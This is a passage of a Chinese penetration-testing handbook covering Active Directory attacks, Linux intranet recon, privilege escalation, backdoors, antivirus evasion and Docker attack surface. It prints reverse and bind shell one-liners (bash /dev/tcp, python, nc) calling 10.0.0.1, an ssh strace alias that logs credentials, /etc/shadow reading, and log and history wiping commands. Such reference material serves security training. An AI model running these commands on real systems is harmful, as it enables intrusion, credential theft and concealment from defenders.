基于 NetBIOS 有 NBNS (NetBIOS Name Service) 服务，通常监听在 UDP 137 端口，该服务提供三种功能：将 NetBIOS 名称解析到 IP、查询某一个 NetBIOS 节点的状态，注册/释放一个 NetBIOS 名。

可以使用 nbtstat 工具利用 NetBIOS 协议管理网络。

#### LLMNR

链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR) 是一个基于 DNS 数据包格式的协议，IPv4 和 IPv6 的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在 Windows Vista后被引入。LLMNR 监听 UDP 5355 端口，可以通过多播地址 224.0.0.252 (或 FF02:0:0:0:0:0:1:3) 访问。

#### mDNS

mDNS (multicast DNS) 在 Windows 10 中被引入，监听 UDP 5353 端口，对应的多播地址为 224.0.0.251 (FF02::FB ) 。mDNS 主要实现了在没有传统 DNS 服务器的情况下使局域网内的主机实现相互发现和通信。

#### WPAD

网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用 DHCP 和/或 DNS 发现方法来定位一个配置文件 URL 的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定 URL 应使用的代理。

#### 域

**域**指将网络中多台计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。

#### 域树

**域树（Trees）**由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）。

#### 林

**林（Forests）**是一个复杂的 AD 实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。

#### 域控制器

ADDS 的目录存储在域控制器 (Domain Controller) 内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库。

在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。

AD 数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）。

多主机模式可以直接更新任何一台域控制器内的 AD 对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。

单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。

#### 信任

两个域之间需要创建信任关系，才可以访问对应域内的资源。

#### 域信任类型

Active Directory 的信任方式可以分为以下几种：

-   **Tree-Root Trust**
    -   双向具有转移性
    
-   **Parent-Child Trust**
    -   具有转移性，双向行人
    
-   **Forest Trust**
    -   如果两个林创建了信任关系，则林中所有的域都相互信任
    
    -   两个林之间的信任关系无法自动扩展到其他林上
    
-   **Realm Trust**
    -   ADDS 域可以和非 Windows 系统的 Kerberos 域之间创建信任
    
-   **External Trust**
    -   位于两个林内的域之间可以通过外部信任来创建信任关系
    
-   **Shortcut Trust**
-   可以缩短验证用户身份的时间

#### OU

组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。

#### Active Directory

活动目录（Active Directory，AD)是面向 Windows Server 的目录服务。Active Directory 存储了有关网络对象的信息，并 让管理员和用户能够查找和使用这些信息。

#### ADDS

Active Directory 提供目录服务的组件被称作 Active Directory 域服务（Active Directory Domain Services,

ADDS），负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。

从逻辑上看，ADDS 的组件可以分为 Partition、Schema、Domain、Domain tree、Forest、OU、Container。 Partition 也被称为 naming context，是 AD DS 数据库的一部分。Schema 是存储在 ADDS 中数据的定义。

Container 是为 ADDS 提供组织框架的对象。

从实现上区分，ADDS 可以分为 Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。

每个域控制器都有完整的 ADDS 数据，每个域控都可以处理数据的修改并同步至其他的域控。域控会有一份数据拷贝（Data store），默认存储在 C:\\Windows\\NTDS 目录下。

Global catalog server 是存储全局 catalog 的域控，catlog 以只读的方式存储了一个 multiple-domain forest的所有对象，用于加速搜索。

#### 名称空间

名称空间（namespace）是一块界定好的区域，在区域内可以用名称找到与之相关的信息。

#### 对象与属性

ADDS 内的资源都是以对象（Object）的形式存在的，对象通过属性（Attrbute）来描述其特征。

#### 组策略简介

组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。

组策略有以下功能：

-   管理注册表

-   设置脚本

-   重定向文件夹

-   管理应用程序

-   指定安全选项

#### 常用概念

组策略容器 (Group Policy Container，GPC) 存储在活动目录中，包含 GPO 属性、配置信息和版本等。可以通过 GPC 来查找 GPT。

组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。

其中 GPC 中的信息量少、容量小，GPT 中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。

组策略对象 (Group Policy Object, GPO) 是包含多种 Windows 组策略设置的集合，存储在 GPC 和 GPT中。

#### Kerberos 的 Windows 实现相关定义

##### SPN

服务主体名称 (ServicePrincipal Names, SPN) ，是服务实例 (如 HTTP、SMB 等) 的唯一标识符。

SPN 分为两种类型：一种是注册在活动目录的机器帐户下，当一个服务的权限为 Local System 或 Network Service，则 SPN 注册在机器帐户下。一种是注册在活动目录的域用户帐户下，当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户下。

#### 攻击类型

##### 1,黄金票据利用

在认证过程中，经过 client 与 AS 的通信会得到 TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。

黄金票据利用需要与 DC 通信， 需要获取 krbtgt 的 hash，但是可以获取任何 Kerbose 服务权限。

##### 2.白银票据利用

白银票据（Silver Tickets）伪造利用的是 Kerberos 认证中的第三个步骤，在第三步的时候，client 会带着 ticket 向 server 的某个服务进行请求，如果验证通过就可以访问 server 上的指定服务了，这里的 ticket 是基于 client info、server session key、end time、server hash。这里 client info 已知，end time 可以构造，server session key 是 TGS 生成的，所以只要 server 的 NTLM hash 即可。银票伪造的是 TGS，只能访问指定的服务。

##### 3.DCSync 攻击

DCSync 是域渗透中经常会用到的技术。DCSync 是 mimikatz 在 2015 年添加的一个功能，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，基于 [DRS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) 来导出域内所有用户的 hash。

这种方式需要满足以下任一一种权限：

-   Administrators 组内的用户

-   Domain Admins 组内的用户

-   Enterprise Admins 组内的用户

-   域控制器的计算机帐户

##### 4.DCShadow 攻击

DCShadow 是由来自法国的安全研究人员 Benjamin Delpy 和 Vincent Le Toux 在 2018 年的微软蓝帽（Blue Hat）大会上提出。

DCShadow 攻击指在 Active Directory 环境下创建一个恶意的域控制器，并用它来推送恶意对象。

##### 5.哈希传递攻击

哈希传递攻击（Pass-the-Hash，PTH）是通过传递 NTLM 哈希来认证的攻击方法，常用的工具有 mimikatz等。

##### 6.票据传递攻击

票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用黄金票据和白银票据，通过 PtT 访问主机相当简单。

##### 7.Kerberoasting Attacks

Kerberoasting 攻击由 Tim Medin 在 2014 DerbyCon conference 上 [公开](https://www.youtube.com/watch?v=PUyhlN-E5MU) 。指域内的任何一台主机，都可以通过查询 SPN，Kerberoasting 即是向域内的所有服务请求 TGS，然后进行暴力破解。

##### 8.Roasting AS-REP

该攻击枚举域中不需要 Kerberos 预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了 DONT_REQ_PREAUTH 。

##### 9.Kerberos Delegation Attacks

在一个域中，A 使用 Kerberos 身份验证访问服务 B，B 再使用 A 的身份去访问 C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。

Kerberos Delegation（Kerberos 委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。

#### 其他漏洞利用

-   ProxyLogon (CVE-2021-26855)
-   ProxyShell (CVE-2021-34473)
-   SMBGhost (CVE-2020-0796)
-   Zerologon (CVE-2020-1472)
-   永恒之蓝 (MS17-010)




## 6.2 Linux 内网渗透

### 6.2.1 信息收集 

#### 获取内核，操作系统和设备信息

-   **版本信息**
    -   uname -a 所有版本
    
    -   uname -r 内核版本信息
    
    -   uname -n 系统主机名字
    
    -   uname -m Linux 内核架构
    
-   内核信息 cat /proc/version

-   CPU 信息 cat /proc/cpuinfo

-   **发布信息**
    -   cat /etc/\*-release
    
    -   cat /etc/issue
    
-   主机名 hostname

-   文件系统 df -a

-   内核日志 dmesg / /var/log/dmesg

#### 用户和组

-   列出系统所有用户 cat /etc/passwd

-   列出系统所有组 cat /etc/group

-   列出所有用户 hash（root）''cat /etc/shadow''

-   **用户**
    -   查询用户的基本信息 finger
    
    -   当前登录的用户 users who -a /var/log/utmp
    
    -   查询无密码用户 grep \'x:0:\' /etc/passwd
    
-   目前登录的用户 w

-   登入过的用户信息 last / /var/log/wtmp

-   显示系统中所有用户最近一次登录信息 lastlog / /var/log/lastlog

-   登录成功日志 /var/log/secure

-   登录失败日志 /var/log/faillog

-   查看特权用户 grep :0 /etc/passwd

-   查看 passwd 最后修改时间 ls -l /etc/passwd

-   查看是否存在空口令用户 awk -F: \'length(\$2)==0 {print \$1}\' /etc/shadow

-   查看远程登录的账号 awk \'/\\\$1\|\\\$6/{print \$1}\' /etc/shadow

-   **查看具有 sudo 权限的用户**
-   cat /etc/sudoers \| grep -v \"\^#\\\|\^\$\" \| grep \"ALL=(ALL)\"

#### 用户和权限信息

-   当前用户 whoami

-   当前用户信息 id

-   可以使用 sudo 提升到 root 的用户（root）cat /etc/sudoers

-   列出目前用户可执行与无法执行的指令 sudo -l

#### 环境信息

-   打印系统环境信息 env

-   打印系统环境信息 set

-   环境变量中的路径信息 echo \$PATH

-   打印历史命令 history / \~/.bash_history

-   显示当前路径 pwd

-   显示默认系统遍历 cat /etc/profile

-   显示可用的 shell cat /etc/shells

#### 进程信息

-   查看进程信息 ps aux

-   资源占有情况 top -c

-   查看进程关联文件 lsof -c \$PID

-   完整命令行信息 /proc/\$PID/cmdline

-   进程的命令名 /proc/\$PID/comm

-   进程当前工作目录的符号链接 /proc/\$PID/cwd

-   运行程序的符号链接 /proc/\$PID/exe

-   进程的环境变量 /proc/\$PID/environ

-   进程打开文件的情况 /proc/\$PID/fd

#### 服务信息

-   由 inetd 管理的服务列表 cat /etc/inetd.conf

-   由 xinetd 管理的服务列表 cat /etc/xinetd.conf

-   nfs 服务器的配置 cat /etc/exports

-   邮件信息 /var/log/mailog

-   ssh 配置 sshd_config

#### 计划任务

-   显示指定用户的计划作业（root）crontab -l -u %user%

-   **计划任务**
    -   /var/spool/cron/\*
    
    -   /var/spool/anacron/\*
    
    -   /etc/crontab
    
    -   /etc/anacrontab
    
    -   /etc/cron.\*
    
    -   /etc/anacrontab
    
-   **开机启动项**
-   /etc/rc.d/init.d/

#### 网络、路由和通信

-   列出网络接口信息 /sbin/ifconfig -a / ip addr show

-   列出网络接口信息 cat /etc/network/interfaces

-   查看系统 arp 表 arp -a

-   打印路由信息 route / ip ro show

-   查看 dns 配置信息 cat /etc/resolv.conf

-   打印本地端口开放信息 netstat -an

-   列出 iptable 的配置规则 iptables -L

-   查看端口服务映射 cat /etc/services

-   Hostname hostname -f

-   查看进程端口情况 netstat -anltp \| grep \$PID

#### 已安装程序

-   rpm -qa \--last Redhat

-   yum list \| grep installed CentOS

-   ls -l /etc/yum.repos.d/

-   dpkg -l Debian

-   cat /etc/apt/sources.list Debian APT

-   pkg_info xBSD

-   pkginfo Solaris

-   pacman -Q Arch Linux

-   emerge Gentoo

#### 文件

-   最近五天的文件 find / -ctime +1 -ctime -5

-   文件系统细节 debugfs

#### 公私钥信息

-   \~/.ssh

-   /etc/ssh

#### 日志

-   /var/log/boot.log

-   /var/log/cron

-   /var/log/faillog

-   /var/log/lastlog

-   /var/log/messages

-   /var/log/secure

-   /var/log/syslog

-   /var/log/syslog

-   /var/log/wtmp

-   /var/log/wtmp

-   /var/run/utmp

#### 虚拟环境检测

-   lsmod \| grep -i \"vboxsf\\\|vboxguest\"

-   lsmod \| grep -i \"vmw_baloon\\\|vmxnet\"

-   lsmod \| grep -i \"xen-vbd\\\|xen-vnif\"

-   lsmod \| grep -i \"virtio_pci\\\|virtio_net\"

-   lsmod \| grep -i \"hv_vmbus\\\|hv_blkvsc\\\|hv_netvsc\\\|hv_utils\\\|hv_storvsc\"

#### 容器内信息收集

-   capsh \--print

-   cat /proc/1/cgroup

-   env \| grep KUBE

-   ls -l .dockerenv

-   ls -l /run/secrets/Kubernetes.io/

-   mount

-   ps aux

### 6.2.2 持久化

#### 权限提升

-   内核漏洞利用

-   攻击有 root 权限的服务

-   利用第三方服务提权

-   **通过有 SUID 属性的可执行文件**
    -   查找可能提权的可执行文件
    
    -   find / -perm +4000 -ls
    
    -   find / -perm -u=s -type f 2\>/dev/null
    
    -   find / -user root -perm -4000 -print 2\>/dev/null
    
    -   find / -user root -perm -4000 -exec ls -ldb {} \\; 2\>/dev/null
    
-   **利用可用的 root 权限**
    -   sudo -l
    
-   利用误配置的 crontab 任务

#### 自启动

-   /etc/init.d

-   /etc/rc.d/rc.local

-   \~/.bashrc

-   \~/.zshrc

#### 后门

-   **ssh 后门**

    -   alias ssh=\'strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh\'

    -   后门账户

-   **常见应用**
    -   ICMP
    
    -   DNS
    
-   icmp 后门

-   后门端口复用

-   . 开头隐藏文件

-   rootkit

### 6.2.3 痕迹清理

#### 历史命令

-   unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;

-   kill -9 \$\$ kill history

-   history -c

-   在 HISTSIZE=0 中设置 HISTSIZE=0

#### 清除/修改日志文件

-   /var/log/btmp

-   /var/log/lastlog

-   /var/log/wtmp

-   /var/log/utmp

-   /var/log/secure

-   /var/log/message

#### 登录痕迹

-   删除 \~/.ssh/known_hosts 中记录

-   **修改文件时间戳**
    -   touch --r
    
-   删除 tmp 目录临时文件

#### 操作痕迹

-   vim 不记录历史命令 :set history=0

-   **ssh登录痕迹**
-   无痕登录 ssh -T user@host /bin/bash -i

#### 覆写文件

-   shred

-   dd

-   wipe

#### 难点

-   攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征

-   即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录

-   留存的后门包含攻击者的信息

-   使用的代理或跳板可能会被反向入侵

#### 注意

-   在操作前检查是否有用户在线

-   删除文件使用磁盘覆写的功能删除

-   尽量和攻击前状态保持一致

#### 参考链接 

-   [Linux 入侵痕迹清理技巧](https://mp.weixin.qq.com/s/i2WvFmF1qQjbx-BaStXb1Q)



## 6.3 后门技术

### 6.3.1 开发技术

**管控功能实现技术**

-   系统管理：查看系统基本信息，进程管理，服务管理

-   文件管理：复制/粘贴文件，删除文件/目录，下载/上传文件等

-   Shell 管理

-   击键记录监控

-   屏幕截取

-   音频监控

-   视频监控

-   隐秘信息查看

-   移动磁盘的动态监控

-   远程卸载

**自启动技术**

-   **Windows 自启动**

    -   基于 Windows 启动目录的自启动

    -   基于注册表的自启动

    -   基于服务程序的自启动

    -   基于 ActiveX 控件的自启动

    -   基于计划任务（Scheduled Tasks）的自启动

-   Linux 自启动

**用户态进程隐藏技术**

-   **基于 DLL 插入的进程隐藏**

    -   远程线程创建技术

    -   设置窗口挂钩（HOOK）技术

-   基于 SvcHost 共享服务的进程隐藏

-   进程内存替换

**数据穿透和躲避技术**

-   反弹端口

-   **协议隧道**
-   HTTP
    
-   MSN
    
-   Google Talk

内核级隐藏技术（Rootkit）

**磁盘启动级隐藏技术（Bootkit）**

-   MBR

-   BIOS

-   NTLDR

-   boot.ini

还原软件对抗技术

### 6.3.2 后门免杀

**传统静态代码检测**

-   加壳

-   添加花指令

-   输入表免杀

**启发式代码检测**

-   动态函数调用

**云查杀**

-   动态增大自身体积

-   更改云查杀服务器域名解析地址

-   断网

-   利用散列碰撞绕过云端"白名单"

**攻击主防杀毒软件**

-   更改系统时间

-   窗口消息攻击

-   主动发送 IRP 操纵主防驱动

**利用证书信任**

-   盗取利用合法证书

-   利用散列碰撞伪造证书

-   利用合法程序 DLL 劫持问题的"白加黑"

### 6.3.3 检测技术

-   基于自启动信息的检测

-   基于进程信息的检测

-   基于数据传输的检测

-   Rootkit/Bootkit 的检测

### 6.3.4 后门分析

-   动态分析

-   **静态分析**
-   反病毒引擎扫描
    
-   文件格式识别
    
-   文件加壳识别及脱壳
    
-   明文字符串查找
    
-   链接库及导入/导出函数分析

## 6.4 综合技巧

### 6.4.1 端口转发

-   **windows**
    -   lcx
    
    -   netsh
    
-   **linux**
    -   portmap
    
    -   iptables
    
-   **socket 代理**
    -   Win: xsocks
    
    -   Linux: proxychains
    
-   **基于 http 的转发与 socket 代理 (低权限下的 透)**
    -   端口转发: tunna
    
    -   socks 代理: reGeorg
    
-   **ssh 通道**
-   端口转发
    
-   socks

### 6.4.2 获取 shell

-   常规 shell 反弹

```shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_
,→STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.
,→dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

-   突破防火墙的 imcp_shell 反弹
-   正向 shell

```shell
nc -e /bin/sh -lp 1234
nc.exe -e cmd.exe -lp 1234
```

### 6.4.3 内网文件传输

-   #### windows 下文件传输

    -   powershell

    -   vbs 脚本文件

    -   bitsadmin

    -   文件共享

    -   使用 telnet 接收数据

    -   hta

-   #### linux 下文件传输

    -   python

    -   wget

    -   tar + ssh

    -   利用 dns 传输数据

-   #### 文件编译

    -   powershell 将 exe 转为 txt，再 txt 转为 exe

### 6.4.4 远程连接 && 执行程序

-   at&schtasks

-   psexec

-   wmic

-   wmiexec.vbs

-   smbexec

-   powershell remoting

-   SC 创建服务执行

-   schtasks

-   SMB+MOF \|\| DLL Hijacks

-   PTH + compmgmt.msc

## 6.5 参考链接

### 6.5.1 Windows

-   [Windows 威胁防护](https://docs.microsoft.com/zh-cn/windows/security/threat-protection/)

-   [Windows 内网渗透提权](https://www.freebuf.com/articles/system/114731.html)

-   [文件寄生 NTFS 文件流实际应用](https://gh0st.cn/archives/2017-03-29/1)

-   [Windows 中常见后门持久化方法总结](https://xz.aliyun.com/t/6461)

-   [LOLBAS](https://lolbas-project.github.io/)

-   [渗透技巧------Windows 单条日志的删除](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/)

-   [windows 取证文件执行记录的获取和清除](https://xz.aliyun.com/t/7155)

-   [Getting DNS Client Cached Entries with CIM/WMI](https://www.darkoperator.com/blog/2020/1/14/getting-dns-client-cached-entries-with-cimwmi)

-   [Windows 单机 Persistence](https://lengjibo.github.io/Persistence/)

-   [Dumping RDP Credentials](https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/)

#### 域渗透

-   [绕过域账户登录失败次数的限制](https://nosec.org/home/detail/2510.html)
-   [域渗透总结](https://mp.weixin.qq.com/s?__biz=Mzg3NzE5OTA5NQ%3D%3D&mid=2247483807&idx=1&sn=59be50aa5cc735f055db596269a857ce)
-   [got domain admin on internal network](https://medium.com/%40adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)

-   [域渗透学习笔记](https://github.com/uknowsec/Active-Directory-Pentest-Notes)

-   [QOMPLX Knowledge: Fundamentals of Active Directory Trust Relationships](https://qomplx.com/qomplx-knowledge-fundamentals-of-active-directory-trust-relationships/)

-   [Kerberos 的黄金票据详解](https://www.cnblogs.com/backlion/p/8127868.html)

-   [DCShadow explained: A technical deep dive into the latest AD attack technique](https://blog.alsid.eu/dcshadow-explained-4510f52fc19d)

-   [Active Directory Security](https://adsecurity.org/)

-   [Kerberos AD Attacks Kerberoasting](https://blog.xpnsec.com/kerberos-attacks-part-1/)

-   [Kerberos 之域内委派攻击](https://xz.aliyun.com/t/7517)

-   [adsec](https://github.com/cfalta/adsec) An introduction to Active Directory security

-   [Attacking Active Directory](https://zer1t0.gitlab.io/posts/attacking_ad/)

### 6.5.2 RedTeam

-   [RedTeamManual](https://github.com/klionsec/RedTeamManual)

### 6.5.3 内网

-   [内网安全检查](https://xz.aliyun.com/t/2354)

-   [我所知道的内网渗透](https://www.anquanke.com/post/id/92646)

-   [从零开始内网渗透学习](https://github.com/l3m0n/pentest_study)

-   [渗透技巧从Github下载安装文件](https://xz.aliyun.com/t/1649/)

-   [An introduction to privileged file operation abuse on Windows](https://offsec.provadys.com/intro-to-file-operation-abuse-on-Windows.html)

-   [脚本维权tips](https://xz.aliyun.com/t/4522)

### 6.5.4 Cobalt Strike

-   [Cobalt Strike 系列笔记](http://blog.leanote.com/post/snowming/Cobalt-Strike)

-   [渗透利器 Cobalt Strike 第 2 篇 APT 级的全面免杀与企业纵深防御体系的对抗](https://xz.aliyun.com/t/4191)



# 七.云安全

## 7.1 容器标准

### 7.1.1 OCI

开放容器标准 (Open Container Initiative, OCI) 是用于规范容器格式和运行时行业标准。目前 OCI 提出的规范有：

-   [OCI Runtime Specification](https://github.com/opencontainers/runtime-spec)

-   [OCI Image Format](https://github.com/opencontainers/image-spec)

-   [OCI Distribution Specification](https://github.com/opencontainers/distribution-spec)

### 7.1.2 CRI

容器运行时 (Container Runtime Interface, CRI) 定义了容器和镜像的接口，目前官方支持的容器运行时包括 Docker、Containerd、CRI-O 和 frakti。

### 7.1.3 参考链接

#### 文档

-   [Introducing Container Runtime Interface (CRI) in Kubernetes](https://kubernetes.io/blog/2016/12/container-runtime-interface-cri-in-kubernetes/)

-   [cri-o](https://cri-o.io/)

#### 实现

-   [runc](https://github.com/opencontainers/runc) OCI Runtime 的参考实现

-   [Kata Containers](https://github.com/kata-containers/kata-containers) 提供高性能的硬件虚拟化容器运行时

-   [gvisor](https://github.com/google/gvisor) Go 实现的基于用户态内核的容器运行时

-   [buildkit](https://github.com/moby/buildkit) docker build 拆分出来的 build 项目

## 7.2 Docker

### 7.2.1 虚拟化技术与容器技术

#### 传统虚拟化技术

传统虚拟化技术通过添加 hypervisor 层，虚拟出网卡，内存，CPU 等虚拟硬件，再在其上建立客户机，每个客户机都有自己的系统内核。传统虚拟化技术以虚拟机为管理单元，各虚拟机拥有独立的操作系统内核，不共用宿主机的软件系统资源，因此具有良好的隔离性，适用于云计算环境中的多租户场景。

#### 容器技术

容器技术可以看作一种轻量级的虚拟化方式，容器技术在操作系统层进行虚拟化，可在宿主机内核上运行多个虚拟化环境。相比于传统的应用测试与部署，容器的部署无需预先考虑应用的运行环境兼容性问题；相比于传统虚拟机，容器无需独立的操作系统内核就可在宿主机中运行，实现了更高的运行效率与资源利用率。

### 7.2.2 Docker

Docker 是目前最具代表性的容器平台之一，具有持续部署与测试、跨云平台支持等优点。在基于 Kubernetes等容器编排工具实现的容器云环境中，通过对跨主机集群资源的调度，容器云可提供资源共享与隔离、容器编排与部署、应用支撑等功能。

#### 基本概念

Docker 有三个基本概念，镜像（Image）、容器（Container）、仓库（Repository）。镜像是一个只读的模版，由一组文件系统通过 Union FS 技术组成。

镜像是静态的定义，容器是从镜像创建的运行实例。容器的本质是进程，拥有自己独立的命名空间。仓库（Repository）是集中存放镜像文件的场所，用于存储、分发镜像。

容器可以被启动、开始、停止、删除，每个容器都是相互隔离的，可以把容器看做是一个简易版的 Linux 环境（包括 root 用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。

#### 组成

Docker 引擎由如下主要组件构成：Docker 客户端（Docker Client）、Docker 守护进程（Docker daemon）、 containerd 以及 RunC，它们共同负责容器的创建和运行。

Docker Client 是和 Docker Daemon 建立通信客户端，Docker Client 可以通过 http/unix socket 等方式Daemon 建立通信。

Docker Daemon 是容器管理的守护进程，在宿主机运行，作为服务端接受来自客户端的请求，主要功能包括镜像管理、镜像构建、REST API、身份验证、安全、核心网络以及编排。Docker daemon 通过位于 /var/ run/docker.sock 的本地 IPC/Unix socket 来实现 Docker 远程 API，默认非 TLS 网络端口为 2375，TLS默认端口为 2376。

containerd 是容器技术标准化之后出现的，用于将容器运行时从 Docker Daemon 剥离。containerd 主要职责是镜像管理、容器执行。

RunC 是 Docker 按照 OCF 标准制定的一种具体实现，实现了容器启动与停止、资源隔离等功能。

#### 数据

Docker 的数据主要分为持久化和非持久化数据，默认情况下非持久化存储是自动创建生命周期与容器相同，删除容器也会删除非持久化数据，在 Linux 环境下，非持久化数据默认存储于 /var/lib/docker/ 下。

#### 网络

Docker 网络架构源自一种叫作容器网络模型的方案，主要由 CNM、Libnetwork、网络驱动构程。

### 7.2.3 安全风险与安全机制

在考虑 Docker 安全性的时候主要考虑以下几点

-   内核本身的安全性及其对命名空间和 cgroups 的支持

-   Docker 守护进程本身的攻击面

-   内核的"强化"安全功能以及它们如何与容器进行交互

#### Docker 安全基线

![image-20220704135410938](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220704135410938.png)

#### 内核命名空间/namespace

Docker 容器与 LXC 容器非常相似，并 具有相似的安全特性。当使用 docker 运行启动容器时，Docker 会在后台为容器创建一组命名空间和控制组。

命名空间提供了一个最直接的隔离形式：在容器中运行的进程看不到或者无法影响在另一个容器或主机系统中运行的进程。

每个容器也有自己的网络堆栈，这意味着一个容器不能获得对另一个容器的套接字或接口的特权访问。当然，如果主机系统相应设置，容器可以通过各自的网络接口交互。如果为容器指定公共端口或使用链接时，容器之间允许 IP 通信。

它们可以相互 ping 通，发送/接收 UDP 数据包，并建立 TCP 连接，但是如果需要可以限制它们。从网络体系结构的角度来看，给定 Docker 主机上的所有容器都位于网桥接口上。这意味着它们就像通过普通的以太网交换机连接的物理机器一样。

#### Control Group

控制组是 Linux 容器的另一个关键组件，主要作用是实施资源核算和限制。

Cgroup 提供了许多有用的度量标准，但也有助于确保每个容器都能获得公平的内存，CPU 和磁盘 I/O; 更重要的是单个容器不能通过耗尽资源的方式来降低系统的性能。

因此，尽管 Cgroup 不能阻止一个容器访问或影响另一个容器的数据和进程，但它们对于抵御一些拒绝服务攻击是至关重要的。它们对于多租户平台尤其重要，例如公共和私人 PaaS，即使在某些应用程序开始行为不当时也能保证一致的正常运行时间（和性能）。

#### 守护进程的攻击面

使用 Docker 运行容器意味着运行 Docker 守护进程，而这个守护进程当前需要 root 权限，因此，守护进程是需要考虑的一个地方。

首先，只有受信任的用户才能被允许控制 Docker 守护进程。具体来说，Docker 允许您在 Docker 主机和访客容器之间共享一个目录; 它允许你这样做而不限制容器的访问权限。这意味着可以启动一个容器，其中/host目录将成为主机上的/目录，容器将能够不受任何限制地改变主机文件系统。

这具有很强的安全意义：例如，如果通过 Web 服务器测试 Docker 以通过 API 配置容器，则应该更加仔细地进行参数检查，以确保恶意用户无法传递制作的参数，从而导致 Docker 创建任意容器。

守护进程也可能容易受到其他输入的影响，例如从具有 docker 负载的磁盘或从具有 docker pull 的网络加载映像。

最终，预计 Docker 守护进程将运行受限特权，将操作委托给审核良好的子进程，每个子进程都有自己的（非常有限的）Linux 功能范围，虚拟网络设置，文件系统管理等。也就是说，很可能，Docker 引擎本身的部分将在容器中运行。

#### Capability

默认情况下，Docker 采用 Capability 机制来实现用户在以 root 身份运行容器的同时，限制部分 root 的操作。

在大多数情况下，容器不需要真正的 root 权限。因此，Docker 可以运行一个 Capability 较低的集合，这意味着容器中的 root 比真正的 root 要少得多。例如：

-   否认所有挂载操作

-   拒绝访问原始套接字（防止数据包欺骗）

-   拒绝访问某些文件系统操作，如创建新的设备节点，更改文件的所有者或修改属性（包括不可变标志）

-   拒绝模块加载

-   其他

这意味着，即使入侵者在容器内获取 root 权限，进一步攻击也会困难很多。默认情况下，Docker 使用白名单而不是黑名单，去除了所有非必要的功能。

#### Seccomp

Docker 使用 Seccomp 来限制容器对宿主机内核发起的系统调用。

### 7.2.4 攻击面分析

#### 供应链安全

在构建 Dockerfile 的过程中，即使是使用排名靠前的来源，也可能存在 CVE 漏洞、后门、镜像被污染、镜像中的依赖库存在漏洞等问题。

#### 虚拟化风险

虽然 Docker 通过命名空间进行了文件系统资源的基本隔离，但仍有 /sys 、/proc/sys 、/proc/bus 、/dev、time 、syslog 等重要系统文件目录和命名空间信息未实现隔离，而是与宿主机共享相关资源。

#### 利用内核漏洞逃逸

-   CVE-2016-5195

#### 容器逃逸漏洞

-   CVE-2021-41091

-   CVE-2019-14271 Docker cp

-   CVE-2019-13139 Docker build code execution

-   **CVE-2019-5736 runC**
    -   Docker Version \< 18.09.2
    
    -   Version \<= 1.0-rc6
    
-   CVE-2018-18955

#### 配置不当

-   开启 privileged

-   挂载宿主机敏感目录

-   **配置 cap 不当**
    -   \--cap-add=SYS_ADMIN
    
-   **绕过 namespace**
-   \--net=host
    
-   \--pid=host
    
-   \--ipc=host

#### 拒绝服务

-   CPU 耗尽

-   内存耗尽

-   存储耗尽

-   网络资源耗尽

#### 危险挂载

-   挂载 /var/run/docker.sock

-   挂载宿主机 /dev /proc 等危险目录

#### 攻击 Docker 守护进程

